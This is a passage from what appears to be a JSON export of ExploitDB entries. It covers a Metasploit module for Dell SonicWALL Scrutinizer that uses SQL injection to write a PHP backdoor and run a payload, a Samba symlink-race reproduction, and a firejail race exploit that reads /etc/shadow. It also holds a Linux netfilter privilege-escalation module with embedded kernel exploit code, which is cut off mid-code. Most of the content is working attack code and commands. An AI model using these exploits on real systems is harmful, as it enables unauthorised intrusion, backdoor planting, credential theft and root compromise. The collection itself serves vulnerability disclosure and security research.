opts [String] :sid\r\n  # @option opts [String] :uid\r\n  # @option opts [String] :os\r\n  # @return [void]\r\n  def upload_php_backdoor(opts)\r\n    d4d_path       = opts[:d4d_path]\r\n    backdoor_fname = opts[:backdoor_fname]\r\n    payload_fname  = opts[:payload_fname]\r\n    sid            = opts[:sid]\r\n    uid            = opts[:uid]\r\n    os             = opts[:os]\r\n\r\n    print_status(\"Injecting a PHP upload backdoor (#{backdoor_fname})...\")\r\n    hex_backdoor = get_php_backdoor(os).unpack(\"H*\")[0]\r\n    sqli_str = \"-6045 UNION ALL SELECT 0x#{hex_backdoor},#{pad_null(19)} INTO DUMPFILE '#{d4d_path}/#{backdoor_fname}' #\"\r\n    do_sqli(sqli_str, sid, uid)\r\n  end\r\n\r\n\r\n  # Attempts a SQL injection attack against the target machine.\r\n  #\r\n  # @param os [String] OS information.\r\n  # @param sid [String] Session ID.\r\n  # @param uid [String] User ID.\r\n  # @return [void]\r\n  def do_backdoor_sqli(os, sid, uid)\r\n    backdoor_fname = \"#{Rex::Text.rand_text_alpha(6)}.php\"\r\n    payload_fname  = Rex::Text.rand_text_alpha(5)\r\n    payload_fname << '.exe' if @my_target['Platform'].match(WINDOWS)\r\n    d4d_path       = get_d4d_path(os)\r\n\r\n    register_files_for_cleanup(backdoor_fname, payload_fname)\r\n\r\n    opts = {\r\n      d4d_path: d4d_path,\r\n      backdoor_fname: backdoor_fname,\r\n      payload_fname: payload_fname,\r\n      sid: sid,\r\n      uid: uid,\r\n      os: os\r\n    }\r\n\r\n    upload_php_backdoor(opts)\r\n    upload_payload(backdoor_fname, payload_fname)\r\n  end\r\n\r\n\r\n  # Tries to set the target. If the user manually set one, then avoid automatic target.\r\n  #\r\n  # @param os [String] OS information.\r\n  # @return [void]\r\n  def try_set_target(os)\r\n    @my_target = target if target != targets[0]\r\n    case os\r\n    when WINDOWS\r\n      @my_target = targets[1]\r\n    when LINUX\r\n      @my_target = targets[2]\r\n    else\r\n      fail_with(Failure::NoTarget, 'Unsupported target')\r\n    end\r\n  end\r\n\r\n\r\n  # Exploits the target machine. To do this, first we must log into the system in order to obtain\r\n  # the user ID and session ID. After logging in, we can ask the vulnerable code to upload a\r\n  # malicious PHP backdoor, and then finally use that backdoor to upload and execute our payload.\r\n  def exploit\r\n    res = do_login\r\n    uid = res['userid']\r\n    sid = res['sessionid']\r\n    os = get_os(sid, uid)\r\n    print_status(\"Detected OS information: #{os}\")\r\n    try_set_target(os)\r\n    do_backdoor_sqli(os, sid, uid)\r\n  end\r\n\r\nend",
                "description": "Dell SonicWALL Scrutinizer 11.01 - methodDetail SQL Injection (Metasploit)",
                "author": "Metasploit",
                "_id": 39836,
                "source": "ExploitDB",
                "platform": "multiple",
                "date": "2016-05-17T00:00:00+00:00",
                "cve": [],
                "type": "remote",
                "port": 0
            },
            {
                "code": "Source: https://bugs.chromium.org/p/project-zero/issues/detail?id=1039\r\n\r\nThe Samba server is supposed to only grant access to configured share\r\ndirectories unless \"wide links\" are enabled, in which case the server is allowed\r\nto follow symlinks. The default (since CVE-2010-0926) is that wide links are\r\ndisabled.\r\n\r\nsmbd ensures that it isn't following symlinks by calling lstat() on every\r\npath component, as can be seen in strace (in reaction to the request\r\n\"get a/b/c/d/e/f/g/h/i/j\", where /public is the root directory of the share):\r\n\r\nroot@debian:/home/user# strace -e trace=file -p18954\r\nProcess 18954 attached\r\nlstat(\"a/b/c/d/e/f/g/h/i/j\", {st_mode=S_IFREG|0644, st_size=4, ...}) = 0\r\ngetcwd(\"/public\", 4096)                 = 8\r\nlstat(\"/public/a\", {st_mode=S_IFDIR|0755, st_size=4096, ...}) = 0\r\nlstat(\"/public/a/b\", {st_mode=S_IFDIR|0755, st_size=4096, ...}) = 0\r\nlstat(\"/public/a/b/c\", {st_mode=S_IFDIR|0755, st_size=4096, ...}) = 0\r\nlstat(\"/public/a/b/c/d\", {st_mode=S_IFDIR|0755, st_size=4096, ...}) = 0\r\nlstat(\"/public/a/b/c/d/e\", {st_mode=S_IFDIR|0755, st_size=4096, ...}) = 0\r\nlstat(\"/public/a/b/c/d/e/f\", {st_mode=S_IFDIR|0755, st_size=4096, ...}) = 0\r\nlstat(\"/public/a/b/c/d/e/f/g\", {st_mode=S_IFDIR|0755, st_size=4096, ...}) = 0\r\nlstat(\"/public/a/b/c/d/e/f/g/h\", {st_mode=S_IFDIR|0755, st_size=4096, ...}) = 0\r\nlstat(\"/public/a/b/c/d/e/f/g/h/i\", {st_mode=S_IFDIR|0755, st_size=4096, ...}) = 0\r\nlstat(\"/public/a/b/c/d/e/f/g/h/i/j\", {st_mode=S_IFREG|0644, st_size=4, ...}) = 0\r\nstat(\"a/b/c/d/e/f/g/h/i/j\", {st_mode=S_IFREG|0644, st_size=4, ...}) = 0\r\ngetxattr(\"a/b/c/d/e/f/g/h/i/j\", \"system.posix_acl_access\", 0x7ffc8d870c30, 132) = -1 ENODATA (No data available)\r\nstat(\"a/b/c/d/e/f/g/h/i/j\", {st_mode=S_IFREG|0644, st_size=4, ...}) = 0\r\nopen(\"a/b/c/d/e/f/g/h/i/j\", O_RDONLY)   = 35\r\n\r\n\r\nThis is racy: Any of the path components - either one of the directories or the\r\nfile at the end - could be replaced with a symlink by an attacker over a second\r\nconnection to the same share. For example, replacing a/b/c/d/e/f/g/h/i\r\nwith a symlink  to / immediately before the open() call would cause smbd to open\r\n/j.\r\n\r\nTo reproduce:\r\n\r\n - Set up a server with Samba 4.5.2. (I'm using Samba 4.5.2 from Debian\r\n   unstable. I'm running the attacks on a native machine while the server is\r\n   running in a VM on the same machine.)\r\n - On the server, create a world-readable file \"/secret\" that contains some\r\n   text. The goal of the attacker is to leak the contents of that file.\r\n - On the server, create a directory \"/public\", mode 0777.\r\n - Create a share named \"public\", accessible for guests, writable, with path\r\n   \"/public\".\r\n - As the attacker, patch a copy of the samba-4.5.2 sourcecode with the patch in\r\n   attack_commands.patch.\r\n - Build the patched copy of samba-4.5.2. The built smbclient will be used in\r\n   the following steps.\r\n - Prepare the server's directory layout remotely and start the rename side of\r\n   the race:\r\n\r\n   $ ./bin/default/source3/client/smbclient -N -U guest //192.168.56.101/public\r\n   ./bin/default/source3/client/smbclient: Can't load /usr/local/samba/etc/smb.conf - run testparm to debug it\r\n   Domain=[WORKGROUP] OS=[Windows 6.1] Server=[Samba 4.5.2-Debian]\r\n   smb: \\> posix\r\n   Server supports CIFS extensions 1.0\r\n   Server supports CIFS capabilities locks acls pathnames posix_path_operations large_read posix_encrypt\r\n   smb: /> ls\r\n     .                                   D        0  Wed Dec 14 23:54:30 2016\r\n     ..                                  D        0  Wed Dec 14 13:02:50 2016\r\n\r\n        98853468 blocks of size 1024. 66181136 blocks available\r\n   smb: /> symlink / link\r\n   smb: /> mkdir normal\r\n   smb: /> put /tmp/empty normal/secret # empty file\r\n   putting file /tmp/empty as /normal/secret (0.0 kb/s) (average 0.0 kb/s)\r\n   smb: /> rename_loop link normal foobar\r\n\r\n - Over a second connection, launch the read side of the race:\r\n\r\n   $ ./bin/default/source3/client/smbclient -N -U guest //192.168.56.101/public\r\n   ./bin/default/source3/client/smbclient: Can't load /usr/local/samba/etc/smb.conf - run testparm to debug it\r\n   Domain=[WORKGROUP] OS=[Windows 6.1] Server=[Samba 4.5.2-Debian]\r\n   smb: \\> posix\r\n   Server supports CIFS extensions 1.0\r\n   Server supports CIFS capabilities locks acls pathnames posix_path_operations large_read posix_encrypt\r\n   smb: /> dump foobar/secret\r\n\r\n - At this point, the race can theoretically be hit. However, because the\r\n   renaming client performs operations synchronously, the network latency makes\r\n   it hard to win the race. (It shouldn't be too hard to adapt the SMB client to\r\n   be asynchronous, which would make the attack much more practical.) To make it\r\n   easier to hit the race, log in to the server as root and run \"strace\" against\r\n   the process that is trying to access foobar/secret all the time without any\r\n   filtering (\"strace -p19624\"). On my machine, this causes the race to be hit\r\n   every few seconds, and the smbclient that is running the \"dump\" command\r\n   prints the contents of the file each time the race is won.\r\n\r\n\r\nProof of Concept:\r\nhttps://github.com/offensive-security/exploitdb-bin-sploits/raw/master/bin-sploits/41740.zip",
                "description": "Samba 4.5.2 - Symlink Race Permits Opening Files Outside Share Directory",
                "author": "Google Security Research",
                "_id": 41740,
                "source": "ExploitDB",
                "platform": "multiple",
                "date": "2017-03-27T00:00:00+00:00",
                "cve": [
                    "CVE-2010-0926"
                ],
                "type": "remote",
                "port": 0
            },
            {
                "code": "# firejail advisory for TOCTOU in --get and --put (local root)\r\n\r\nReleasing a brief advisory/writeup about a local root privesc found in firejail that we reported back in Nov, 2016. This is in response to a recent [thread](http://seclists.org/oss-sec/2017/q1/20) on oss-sec where people seem interested in details of firejail security issues. This particular vulnerability was fixed in commit [e152e2d](https://github.com/netblue30/firejail/commit/e152e2d067e17be33c7e82ce438c8ae740af6a66) but no CVE was assigned.\r\n\r\n## Vulnerability\r\n\r\nThis is a TOCTOU (race condition) bug when testing access permissions with access() and then calling copy_file(). At the time of discovery, it was clear the code suffered from many insecure coding constructs like this and much more -- but there was no guideline around making security related bug reports (other than using the public issue tracker).\r\n\r\n### Code: src/firejail/ls.c\r\n~~~~\r\nvoid sandboxfs(int op, pid_t pid, const char *path) {\r\n        EUID_ASSERT();\r\n\r\n        // if the pid is that of a firejail  process, use the pid of the first child process\r\n        EUID_ROOT();\r\n        char *comm = pid_proc_comm(pid);\r\n        EUID_USER();\r\n        if (comm) {\r\n                if (strcmp(comm, \"firejail\") == 0) {\r\n                        pid_t child;\r\n                        if (find_child(pid, &child) == 0) {\r\n                                pid = child;\r\n                        }\r\n                }\r\n                free(comm);\r\n        }\r\n\r\n        // check privileges for non-root users\r\n        uid_t uid = getuid();\r\n        if (uid != 0) {\r\n                uid_t sandbox_uid = pid_get_uid(pid);\r\n                if (uid != sandbox_uid) {\r\n                        fprintf(stderr, \"Error: permission denied.\\n\");\r\n                        exit(1);\r\n                }\r\n        }\r\n\r\n        // full path or file in current directory?\r\n        char *fname;\r\n        if (*path == '/') {\r\n                fname = strdup(path);\r\n                if (!fname)\r\n                        errExit(\"strdup\");\r\n        }\r\n        else if (*path == '~') {\r\n                if (asprintf(&fname, \"%s%s\", cfg.homedir, path + 1) == -1)\r\n                        errExit(\"asprintf\");\r\n        }\r\n        else {\r\n                fprintf(stderr, \"Error: Cannot access %s\\n\", path);\r\n                exit(1);\r\n        }\r\n\r\n        // sandbox root directory\r\n        char *rootdir;\r\n        if (asprintf(&rootdir, \"/proc/%d/root\", pid) == -1)\r\n                errExit(\"asprintf\");\r\n\r\n        if (op == SANDBOX_FS_LS) {\r\n                EUID_ROOT();\r\n                // chroot\r\n                if (chroot(rootdir) < 0)\r\n                        errExit(\"chroot\");\r\n                if (chdir(\"/\") < 0)\r\n                        errExit(\"chdir\");\r\n\r\n                // access chek is performed with the real UID\r\n                if (access(fname, R_OK) == -1) {\r\n                        fprintf(stderr, \"Error: Cannot access %s\\n\", fname);\r\n                        exit(1);\r\n                }\r\n\r\n                // list directory contents\r\n                struct stat s;\r\n                if (stat(fname, &s) == -1) {\r\n                        fprintf(stderr, \"Error: Cannot access %s\\n\", fname);\r\n                        exit(1);\r\n                }\r\n                if (S_ISDIR(s.st_mode)) {\r\n                        char *rp = realpath(fname, NULL);\r\n                        if (!rp) {\r\n                                fprintf(stderr, \"Error: Cannot access %s\\n\", fname);\r\n                                exit(1);\r\n                        }\r\n                        if (arg_debug)\r\n                                printf(\"realpath %s\\n\", rp);\r\n\r\n                        char *dir;\r\n                        if (asprintf(&dir, \"%s/\", rp) == -1)\r\n                                errExit(\"asprintf\");\r\n\r\n                        print_directory(dir);\r\n                        free(rp);\r\n                        free(dir);\r\n                }\r\n                else {\r\n                        char *rp = realpath(fname, NULL);\r\n                        if (!rp) {\r\n                                fprintf(stderr, \"Error: Cannot access %s\\n\", fname);\r\n                                exit(1);\r\n                        }\r\n                        if (arg_debug)\r\n                                printf(\"realpath %s\\n\", rp);\r\n                        char *split = strrchr(rp, '/');\r\n                        if (split) {\r\n                                *split = '\\0';\r\n                                char *rp2 = split + 1;\r\n                                if (arg_debug)\r\n                                        printf(\"path %s, file %s\\n\", rp, rp2);\r\n                                print_file_or_dir(rp, rp2, 1);\r\n                        }\r\n                        free(rp);\r\n                }\r\n        }\r\n\r\n        // get file from sandbox and store it in the current directory\r\n        else if (op == SANDBOX_FS_GET) {\r\n                // check source file (sandbox)\r\n                char *src_fname;\r\n                if (asprintf(&src_fname, \"%s%s\", rootdir, fname) == -1)\r\n                        errExit(\"asprintf\");\r\n                EUID_ROOT();\r\n                struct stat s;\r\n                if (stat(src_fname, &s) == -1) {\r\n                        fprintf(stderr, \"Error: Cannot access %s\\n\", fname);\r\n                        exit(1);\r\n                }\r\n\r\n\r\n                // try to open the source file - we need to chroot\r\n                pid_t child = fork();\r\n                if (child < 0)\r\n                        errExit(\"fork\");\r\n                if (child == 0) {\r\n                        // chroot\r\n                        if (chroot(rootdir) < 0)\r\n                                errExit(\"chroot\");\r\n                        if (chdir(\"/\") < 0)\r\n                                errExit(\"chdir\");\r\n\r\n                        // drop privileges\r\n                        drop_privs(0);\r\n\r\n                        // try to read the file\r\n                        if (access(fname, R_OK) == -1) {\r\n                                fprintf(stderr, \"Error: Cannot read %s\\n\", fname);\r\n                                exit(1);\r\n                        }\r\n                        exit(0);\r\n                }\r\n\r\n                // wait for the child to finish\r\n                int status = 0;\r\n                waitpid(child, &status, 0);\r\n                if (WIFEXITED(status) && WEXITSTATUS(status) == 0);\r\n                else\r\n                        exit(1);\r\n                EUID_USER();\r\n\r\n                // check destination file (host)\r\n                char *dest_fname = strrchr(fname, '/');\r\n                if (!dest_fname || *(++dest_fname) == '\\0') {\r\n                        fprintf(stderr, \"Error: invalid file name %s\\n\", fname);\r\n                        exit(1);\r\n                }\r\n\r\n                if (access(dest_fname, F_OK) == -1) {\r\n                        // try to create the file\r\n                        FILE *fp = fopen(dest_fname, \"w\");\r\n                        if (!fp) {\r\n                                fprintf(stderr, \"Error: cannot create %s\\n\", dest_fname);\r\n                                exit(1);\r\n                        }\r\n                        fclose(fp);\r\n                }\r\n                else {\r\n                        if (access(dest_fname, W_OK) == -1) {\r\n                                fprintf(stderr, \"Error: cannot write %s\\n\", dest_fname);\r\n                                exit(1);\r\n                        }\r\n                }\r\n                // copy file\r\n                EUID_ROOT();\r\n                copy_file(src_fname, dest_fname, getuid(), getgid(), 0644);\r\n                printf(\"Transfer complete\\n\");\r\n                EUID_USER();\r\n        }\r\n\r\n        free(fname);\r\n        free(rootdir);\r\n\r\n        exit(0);\r\n}\r\n~~~~\r\n\r\n\r\n\r\n### Code: src/firejail/util.c\r\n~~~~\r\nint copy_file(const char *srcname, const char *destname, uid_t uid, gid_t gid, mode_t mode) {\r\n        assert(srcname);\r\n        assert(destname);\r\n\r\n        // open source\r\n        int src = open(srcname, O_RDONLY);\r\n        if (src < 0) {\r\n                fprintf(stderr, \"Warning: cannot open %s, file not copied\\n\", srcname);\r\n                return -1;\r\n        }\r\n\r\n        // open destination\r\n        int dst = open(destname, O_CREAT|O_WRONLY|O_TRUNC, S_IRUSR | S_IWUSR | S_IRGRP | S_IROTH);\r\n        if (dst < 0) {\r\n                fprintf(stderr, \"Warning: cannot open %s, file not copied\\n\", destname);\r\n                close(src);\r\n                return -1;\r\n        }\r\n\r\n        // copy\r\n        ssize_t len;\r\n        static const int BUFLEN = 1024;\r\n        unsigned char buf[BUFLEN];\r\n        while ((len = read(src, buf, BUFLEN)) > 0) {\r\n                int done = 0;\r\n                while (done != len) {\r\n                        int rv = write(dst, buf + done, len - done);\r\n                        if (rv == -1) {\r\n                                close(src);\r\n                                close(dst);\r\n                                return -1;\r\n                        }\r\n\r\n                        done += rv;\r\n                }\r\n        }\r\n\r\n        if (fchown(dst, uid, gid) == -1)\r\n                errExit(\"fchown\");\r\n        if (fchmod(dst, mode) == -1)\r\n                errExit(\"fchmod\");\r\n\r\n        close(src);\r\n        close(dst);\r\n        return 0;\r\n}\r\n</snip>\r\n~~~~\r\n\r\n## Testing \r\n\r\n### Our Dockerfile\r\n\r\n~~~~\r\nFROM ubuntu:latest\r\n\r\nENV wdir /root/firejail\r\n\r\nRUN apt-get update && apt-get install -y git gcc make\r\nRUN useradd -ms /bin/bash daniel && echo \"daniel:password\" | chpasswd\r\nRUN git clone https://github.com/netblue30/firejail.git ${wdir}\r\nWORKDIR ${wdir}\r\nRUN git reset --hard 81467143ee9c47d9c90e97fb55baf2d47702d372\r\nRUN ./configure && make && make install\r\n~~~~\r\n\r\n### Our exploit\r\n\r\nThis will exploit the --get command to read /etc/shadow and print back to the console. Just copy and paste into your shell:\r\n\r\n~~~~\r\n#dropper\r\ncat > gexp.sh <<GUEST_JAIL_SCRIPT_EOF\r\nmkdir -p /tmp/exploit\r\ncat > /tmp/exploit/gaolbreak.c <<TOCTOU_POC_END\r\n#include <stdio.h>\r\n#include <stdlib.h>\r\n#include <string.h>\r\n#include <unistd.h>\r\n#include <fcntl.h>\r\n\r\nint main(int argc, char **argv)\r\n{\r\n    char *fl = \"/etc/shadow\";\r\n\r\n    if(argc > 1) {\r\n        fl = argv[1];\r\n    }\r\n\r\n    while(1) {\r\n        int fd = open(\"owned\", O_CREAT | O_RDWR, 0777);\r\n        if(fd == -1) {\r\n            perror(\"open\");\r\n            exit(1);\r\n        }\r\n        close(fd);\r\n        remove(\"owned\");\r\n        symlink(fl, \"owned\");\r\n        remove(\"owned\");\r\n    }\r\n}\r\nTOCTOU_POC_END\r\ncd /tmp/exploit\r\ngcc ./gaolbreak.c -o gaolbreak\r\n# XXX: change argv[1] to whatever you want\r\n./gaolbreak /etc/shadow\r\nGUEST_JAIL_SCRIPT_EOF\r\n\r\n# run the dropper (symlink attack) in a jail\r\nchmod +x ./gexp.sh\r\nfirejail --noprofile --force --name=el ./gexp.sh &\r\n\r\n# win race using the vulnerable 'firejail --get' command.\r\nmkdir exploitel\r\ncd exploitel\r\nwhile [ 1 ] ; do nice -n 19 firejail --get=$(pgrep -f '^firejail.*--name=el' -n) /tmp/exploit/owned >/dev/null 2>&1; cat owned 2>/dev/null; done\r\n~~~~",
                "description": "Firejail - Local Privilege Escalation",
                "author": "Daniel Hodson",
                "_id": 41022,
                "source": "ExploitDB",
                "platform": "linux",
                "date": "2017-01-09T00:00:00+00:00",
                "cve": [],
                "type": "local",
                "port": 0
            },
            {
                "code": "##\r\n# This module requires Metasploit: http://metasploit.com/download\r\n# Current source: https://github.com/rapid7/metasploit-framework\r\n##\r\n\r\nrequire \"msf/core\"\r\n\r\nclass MetasploitModule < Msf::Exploit::Local\r\n  Rank = GoodRanking\r\n\r\n  include Msf::Post::File\r\n  include Msf::Exploit::EXE\r\n  include Msf::Exploit::FileDropper\r\n\r\n  def initialize(info = {})\r\n    super(update_info(info,\r\n        'Name'           => 'Linux Kernel 4.6.3 Netfilter Privilege Escalation',\r\n        'Description'    => %q{\r\n          This module attempts to exploit a netfilter bug on Linux Kernels befoe 4.6.3, and currently\r\n          only works against Ubuntu 16.04 (not 16.04.1) with kernel\r\n          4.4.0-21-generic.\r\n          Several conditions have to be met for successful exploitation:\r\n          Ubuntu:\r\n          1. ip_tables.ko (ubuntu), iptable_raw (fedora) has to be loaded (root running iptables -L will do such)\r\n          2. libc6-dev-i386 (ubuntu), glibc-devel.i686  & libgcc.i686 (fedora) needs to be installed to compile\r\n          Kernel 4.4.0-31-generic and newer are not vulnerable.\r\n\r\n          We write the ascii files and compile on target instead of locally since metasm bombs for not\r\n          having cdefs.h (even if locally installed)\r\n        },\r\n        'License'        => MSF_LICENSE,\r\n        'Author'         =>\r\n          [\r\n            'h00die <mike@stcyrsecurity.com>',  # Module\r\n            'vnik'                         # Discovery\r\n          ],\r\n        'DisclosureDate' => 'Jun 03 2016',\r\n        'Platform'       => [ 'linux'],\r\n        'Arch'           => [ ARCH_X86 ],\r\n        'SessionTypes'   => [ 'shell', 'meterpreter' ],\r\n        'Targets'        =>\r\n          [\r\n            [ 'Ubuntu', { } ]\r\n            #[ 'Fedora', { } ]\r\n          ],\r\n        'DefaultTarget'  => 0,\r\n        'References'     =>\r\n          [\r\n            [ 'EDB', '40049'],\r\n            [ 'CVE', '2016-4997'],\r\n            [ 'URL', 'http://git.kernel.org/cgit/linux/kernel/git/torvalds/linux.git/commit/?id=ce683e5f9d045e5d67d1312a42b359cb2ab2a13c']\r\n          ]\r\n      ))\r\n    register_options(\r\n      [\r\n        OptString.new('WritableDir', [ true, 'A directory where we can write files (must not be mounted noexec)', '/tmp' ]),\r\n        OptInt.new('MAXWAIT', [ true, 'Max seconds to wait for decrementation in seconds', 180 ]),\r\n        OptBool.new('REEXPLOIT', [ true, 'desc already ran, no need to re-run, skip to running pwn',false]),\r\n        OptEnum.new('COMPILE', [ true, 'Compile on target', 'Auto', ['Auto', 'True', 'False']])\r\n      ], self.class)\r\n  end\r\n\r\n  def check\r\n    def iptables_loaded?()\r\n      # user@ubuntu:~$ cat /proc/modules | grep ip_tables\r\n      # ip_tables 28672 1 iptable_filter, Live 0x0000000000000000\r\n      # x_tables 36864 2 iptable_filter,ip_tables, Live 0x0000000000000000\r\n      vprint_status('Checking if ip_tables is loaded in kernel')\r\n      if target.name == \"Ubuntu\"\r\n        iptables = cmd_exec('cat /proc/modules | grep ip_tables')\r\n        if iptables.include?('ip_tables')\r\n          vprint_good('ip_tables.ko is loaded')\r\n        else\r\n          print_error('ip_tables.ko is not loaded.  root needs to run iptables -L or similar command')\r\n        end\r\n        return iptables.include?('ip_tables')\r\n      elsif target.name == \"Fedora\"\r\n        iptables = cmd_exec('cat /proc/modules | grep iptable_raw')\r\n        if iptables.include?('iptable_raw')\r\n          vprint_good('iptable_raw is loaded')\r\n        else\r\n          print_error('iptable_raw is not loaded.  root needs to run iptables -L or similar command')\r\n        end\r\n        return iptables.include?('iptable_raw')\r\n      else\r\n        return false\r\n      end\r\n    end\r\n\r\n    def shemsham_installed?()\r\n      # we want this to be false.\r\n      vprint_status('Checking if shem or sham are installed')\r\n      shemsham = cmd_exec('cat /proc/cpuinfo')\r\n      if shemsham.include?('shem')\r\n        print_error('shem installed, system not vulnerable.')\r\n      elsif shemsham.include?('sham')\r\n        print_error('sham installed, system not vulnerable.')\r\n      else\r\n        vprint_good('shem and sham not present.')\r\n      end\r\n      return (shemsham.include?('shem') or shemsham.include?('sham'))\r\n    end\r\n\r\n    if iptables_loaded?() and not shemsham_installed?()\r\n      return CheckCode::Appears\r\n    else\r\n      return CheckCode::Safe\r\n    end\r\n  end\r\n\r\n  def exploit\r\n    # first thing we need to do is determine our method of exploitation: compiling realtime, or droping a pre-compiled version.\r\n    def has_prereqs?()\r\n      vprint_status('Checking if 32bit C libraries, gcc-multilib, and gcc are installed')\r\n      if target.name == \"Ubuntu\"\r\n        lib = cmd_exec('dpkg --get-selections | grep libc6-dev-i386')\r\n        if lib.include?('install')\r\n          vprint_good('libc6-dev-i386 is installed')\r\n        else\r\n          print_error('libc6-dev-i386 is not installed.  Compiling will fail.')\r\n        end\r\n        multilib = cmd_exec('dpkg --get-selections | grep ^gcc-multilib')\r\n        if multilib.include?('install')\r\n          vprint_good('gcc-multilib is installed')\r\n        else\r\n          print_error('gcc-multilib is not installed.  Compiling will fail.')\r\n        end\r\n        gcc = cmd_exec('which gcc')\r\n        if gcc.include?('gcc')\r\n          vprint_good('gcc is installed')\r\n        else\r\n          print_error('gcc is not installed.  Compiling will fail.')\r\n        end\r\n        return gcc.include?('gcc') && lib.include?('install') && multilib.include?('install')\r\n      elsif target.name == \"Fedora\"\r\n        lib = cmd_exec('dnf list installed | grep -E \\'(glibc-devel.i686|libgcc.i686)\\'')\r\n        if lib.include?('glibc')\r\n          vprint_good('glibc-devel.i686 is installed')\r\n        else\r\n          print_error('glibc-devel.i686 is not installed.  Compiling will fail.')\r\n        end\r\n        if lib.include?('libgcc')\r\n          vprint_good('libgcc.i686 is installed')\r\n        else\r\n          print_error('libgcc.i686 is not installed.  Compiling will fail.')\r\n        end\r\n        multilib = false #not implemented\r\n        gcc = false #not implemented\r\n        return (lib.include?('glibc') && lib.include?('libgcc')) && gcc && multilib\r\n      else\r\n        return false\r\n      end\r\n    end\r\n\r\n    compile = false\r\n    if datastore['COMPILE'] == 'Auto' || datastore['COMPILE'] == 'True'\r\n      if has_prereqs?()\r\n        compile = true\r\n        vprint_status('Live compiling exploit on system')\r\n      else\r\n        vprint_status('Dropping pre-compiled exploit on system')\r\n      end\r\n    end\r\n    if check != CheckCode::Appears\r\n      fail_with(Failure::NotVulnerable, 'Target not vulnerable! punt!')\r\n    end\r\n\r\n    desc_file = datastore[\"WritableDir\"] + \"/\" + rand_text_alphanumeric(8)\r\n    env_ready_file = datastore[\"WritableDir\"] + \"/\" + rand_text_alphanumeric(8)\r\n    pwn_file = datastore[\"WritableDir\"] + \"/\" + rand_text_alphanumeric(8)\r\n    payload_file = rand_text_alpha(8)\r\n    payload_path = \"#{datastore[\"WritableDir\"]}/#{payload_file}\"\r\n\r\n    # direct copy of code from exploit-db, except removed the check for shem/sham and ip_tables.ko since we can do that in the check area here\r\n    # removed         #include <netinet/in.h> per busterb comment in PR 7326\r\n    decr = %q{\r\n      #define _GNU_SOURCE\r\n      #include <stdio.h>\r\n      #include <stdlib.h>\r\n      #include <string.h>\r\n      #include <unistd.h>\r\n      #include <sched.h>\r\n      #include <netinet/in.h>\r\n      #include <linux/sched.h>\r\n      #include <errno.h>\r\n      #include <sys/types.h>\r\n      #include <sys/socket.h>\r\n      #include <sys/ptrace.h>\r\n      #include <net/if.h>\r\n      #include <linux/netfilter_ipv4/ip_tables.h>\r\n      #include <linux/netlink.h>\r\n      #include <fcntl.h>\r\n      #include <sys/mman.h>\r\n\r\n      #define MALLOC_SIZE 66*1024\r\n\r\n      int decr(void *p) {\r\n          int sock, optlen;\r\n          int ret;\r\n          void *data;\r\n          struct ipt_replace *repl;\r\n          struct ipt_entry *entry;\r\n          struct xt_entry_match *ematch;\r\n          struct xt_standard_target *target;\r\n          unsigned i;\r\n\r\n          sock = socket(PF_INET, SOCK_RAW, IPPROTO_RAW);\r\n\r\n          if (sock == -1) {\r\n                  perror(\"socket\");\r\n                  return -1;\r\n          }\r\n\r\n          data = malloc(MALLOC_SIZE);\r\n\r\n          if (data == NULL) {\r\n              perror(\"malloc\");\r\n              return -1;\r\n          }\r\n\r\n          memset(data, 0, MALLOC_SIZE);\r\n\r\n          repl = (struct ipt_replace *) data;\r\n          repl->num_entries = 1;\r\n          repl->num_counters = 1;\r\n          repl->size = sizeof(*repl) + sizeof(*target) + 0xffff;\r\n          repl->valid_hooks = 0;\r\n\r\n          entry = (struct ipt_entry *) (data + sizeof(struct ipt_replace));\r\n          entry->target_offset = 74; // overwrite target_offset\r\n          entry->next_offset = sizeof(*entry) + sizeof(*ematch) + sizeof(*target);\r\n\r\n          ematch = (struct xt_entry_match *) (data + sizeof(struct ipt_replace) + sizeof(*entry));\r\n\r\n          strcpy(ematch->u.user.name, \"icmp\");\r\n          void *kmatch = (void*)mmap((void *)0x10000, 0x1000, 7, 0x32, 0, 0);\r\n          uint64_t *me = (uint64_t *)(kmatch + 0x58);\r\n          *me = 0xffffffff821de10d; // magic number!\r\n\r\n          uint32_t *match = (uint32_t *)((char *)&ematch->u.kernel.match + 4);\r\n          *match = (uint32_t)kmatch;\r\n\r\n          ematch->u.match_size = (short)0xffff;\r\n\r\n          target = (struct xt_standard_target *)(data + sizeof(struct ipt_replace) + 0xffff + 0x8);\r\n          uint32_t *t = (uint32_t *)target;\r\n          *t = (uint32_t)kmatch;\r\n\r\n          printf(\"[!] Decrementing the refcount. This may take a while...\\n\");\r\n          printf(\"[!] Wait for the \\\"Done\\\" message (even if you'll get the prompt back).\\n\");\r\n\r\n          for (i = 0; i < 0xffffff/2+1; i++) {\r\n              ret = setsockopt(sock, SOL_IP, IPT_SO_SET_REPLACE, (void *) data, 66*1024);\r\n          }\r\n\r\n          close(sock);\r\n          free(data);\r\n          printf(\"[+] Done! Now run ./pwn\\n\");\r\n\r\n          return 0;\r\n      }\r\n\r\n      int main(void) {\r\n          void *stack;\r\n          int ret;\r\n\r\n          printf(\"netfilter target_offset Ubuntu 16.04 4.4.0-21-generic exploit by vnik\\n\");\r\n\r\n          ret = unshare(CLONE_NEWUSER);\r\n\r\n          if (ret == -1) {\r\n              perror(\"unshare\");\r\n              return -1;\r\n          }\r\n\r\n          stack = (void *) malloc(65536);\r\n\r\n          if (stack == NULL) {\r\n              perror(\"malloc\");\r\n              return -1;\r\n          }\r\n\r\n          clone(decr, stack + 65536, CLONE_NEWNET, NULL);\r\n\r\n          sleep(1);\r\n\r\n          return 0;\r\n      }\r\n    }\r\n\r\n    # direct copy of code from exploit-db\r\n    pwn = %q{\r\n      #include <stdio.h>\r\n      #include <string.h>\r\n      #include <errno.h>\r\n      #include <unistd.h>\r\n      #include <stdint.h>\r\n      #include <fcntl.h>\r\n      #include <sys/mman.h>\r\n      #include <assert.h>\r\n\r\n      #define MMAP_ADDR 0xff814e3000\r\n      #define MMAP_OFFSET 0xb0\r\n\r\n      typedef int __attribute__((regparm(3))) (*commit_creds_fn)(uint64_t cred);\r\n      typedef uint64_t __attribute__((regparm(3))) (*prepare_kernel_cred_fn)(uint64_t cred);\r\n\r\n      void __attribute__((regparm(3))) privesc() {\r\n          commit_creds_fn commit_creds = (void *)0xffffffff810a21c0;\r\n          prepare_kernel_cred_fn prepare_kernel_cred = (void *)0xffffffff810a25b0;\r\n          commit_creds(prepare_kernel_cred((uint64_t)NULL));\r\n      }\r\n\r\n      int main() {\r\n          void *payload = (void*)mmap((void *)MMAP_ADDR, 0x400000, 7, 0x32, 0, 0);\r\n          assert(payload == (void 